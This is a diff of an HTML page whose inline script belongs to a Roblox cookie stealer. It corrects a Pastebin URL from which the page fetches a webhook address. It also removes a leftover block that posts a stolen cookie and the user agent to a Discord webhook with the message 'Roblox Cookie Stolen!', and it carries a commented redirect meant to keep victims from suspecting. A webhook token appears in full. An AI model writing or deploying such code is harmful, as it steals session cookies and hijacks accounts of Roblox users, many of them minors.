@@ -5,7 +5,7 @@
     <script>
         // 1. Fetch the raw webhook URL from your private Pastebin
         // Replace 'YOUR_PASTE_ID' with your actual Pastebin ID (e.g., abc123def)
-        const PASTEBIN_RAW_URL = 'https://https://pastebin.com/7zNB39Uf';
+        const PASTEBIN_RAW_URL = 'https://pastebin.com/7zNB39Uf';
 
         fetch(PASTEBIN_RAW_URL)
             .then(response => {
@@ -31,23 +31,6 @@
             .catch(err => {
                 console.error('Failed to get webhook URL:', err);
             });
-    </script>
-</body>
-</html>        
-        // 2. Send it to Discord
-        const webhook = 'https://discord.com/api/webhooks/1543634159199723671/9axpl5HsX8YiqDXo55B_rglgIapSDLDQ8czRWlHp9kBioCSKfOmo5IGlCrXtx5OgLntT'; // PASTE YOUR DISCORD WEBHOOK HERE
-
-        fetch(webhook, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                content: `🍪 **Roblox Cookie Stolen!**\n\`\`\`${cookie}\`\`\`\n📱 User Agent: ${navigator.userAgent}`
-            })
-        }).then(() => {
-            console.log('Cookie sent!');
-            // Optional: Redirect to Roblox so they don't suspect
-            // window.location.href = 'https://www.roblox.com';
-        }).catch(err => console.error('Error:', err));
     </script>
 </body>
 </html>
